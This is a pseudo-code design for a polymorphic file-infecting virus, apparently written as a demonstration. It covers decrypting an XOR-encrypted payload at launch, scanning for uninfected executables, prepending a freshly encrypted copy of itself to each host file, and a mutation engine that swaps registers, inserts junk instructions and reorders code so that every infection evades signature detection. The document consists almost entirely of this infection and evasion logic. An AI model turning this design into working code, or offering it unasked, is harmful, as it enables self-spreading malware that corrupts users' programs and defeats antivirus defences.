## Functional Pseudo-Code
```
// TYPE DEFINITIONS
TYPE Byte = 8-bit unsigned integer
TYPE ByteStream = Array[Byte]
TYPE EncryptionKey = 32-bit random integer

// ========================================
// ENTRY POINT: Runs when infected program launches
// ========================================
EntryPoint():
    // Pull stored encryption key and encrypted payload from the current infected binary
    StoredKey = ExtractKeyFromBinary()
    EncryptedPayload = ExtractEncryptedPayloadFromBinary()

    // Decrypt the main virus payload into memory
    DecryptedPayload = XORCipher(EncryptedPayload, StoredKey) // XOR is symmetric for demo

    // Jump execution to the decrypted payload
    JumpToMemoryAddress(DecryptedPayload)
END EntryPoint

// ========================================
// MAIN PAYLOAD: Handles infection of new files
// ========================================
MainVirusPayload():
    // Scan for uninfected executable files to target (demo: local working directory)
    UninfectedTargets = ScanForUninfectedExecutables()

    FOR EACH Target IN UninfectedTargets:
        // Generate a unique random key for THIS specific infection (changes payload signature)
        NewUniqueKey = GenerateRandom32Bit()

        // Encrypt the full virus payload with the new key
        NewEncryptedPayload = XORCipher(GetCurrentFullPayloadBytes(), NewUniqueKey)

        // GENERATE NEW MUTATED DECRYPTOR (core of polymorphism: unique code per infection)
        NewUniqueDecryptor = MutationEngine.GenerateUniqueDecryptor()

        // Assemble the new infected file: decryptor + key + encrypted payload + original host code
        OriginalHostCode = ReadFullFile(Target)
        NewInfectedBinary = NewUniqueDecryptor + NewUniqueKey + NewEncryptedPayload + OriginalHostCode

        // Save the infected file to disk
        WriteFile(Target, NewInfectedBinary)
    NEXT Target

    // Jump back to original host code to run normally (avades detection)
    JumpToOriginalHostEntryPoint()
END MainVirusPayload

// ========================================
// MUTATION ENGINE: Core polymorphic logic
// Generates functionally identical decryptors with unique byte patterns
// ========================================
MODULE MutationEngine:
    // Harmless junk instructions that change byte pattern without changing function
    JUNK_POOL = [
        "NOP",       // No operation
        "ADD R0, 0", // Add 0 to a register (no change)
        "MOV R1, R1",// Move register to itself (no change)
        "XOR R2, R2",// XOR register with itself (still 0, no change)
        "SHL R3, 0"  // Shift by 0 bits (no change)
    ]

    AVAILABLE_REGISTERS = [R0, R1, R2, R3, R4, R5, R6, R7]

    FUNCTION GenerateUniqueDecryptor() -> ByteStream:
        // Start with base decryptor logic (get key, decrypt payload loop)
        MutatedDecryptor = CopyBaseDecryptorTemplate()

        // 1. Random register swapping: Change which registers are used (changes bytecode, same function)
        RandomlyAssignRegisters(MutatedDecryptor, PickRandom(AVAILABLE_REGISTERS, 3))

        // 2. Insert random junk instructions: Add variable amounts of no-op code
        JunkCount = RandomInt(5, 50) // Random number of junk per decryptor
        FOR I FROM 1 TO JunkCount:
            RandomJunk = PickRandom(JUNK_POOL)
            RandomInsertPosition = RandomInt(0, Length(MutatedDecryptor))
            InsertInstruction(MutatedDecryptor, RandomJunk, RandomInsertPosition)
        NEXT I

        // 3. Reorder independent instructions: Swap order of unrelated operations
        ShuffleIndependentInstructions(MutatedDecryptor)

        // Assemble final mutated decryptor to bytecode
        AssembleToBytes(MutatedDecryptor, FinalBytecode)
        RETURN FinalBytecode
    END GenerateUniqueDecryptor
END MODULE MutationEngine

// ========================================
// HELPER FUNCTIONS
// ========================================
FUNCTION XORCipher(Input: ByteStream, Key: EncryptionKey) -> ByteStream:
    Output = Empty ByteStream
    FOR EACH B IN Input:
        Output.Append(B XOR (Key % 256)) // Simple symmetric encryption for demo
    NEXT B
    RETURN Output
END XORCipher
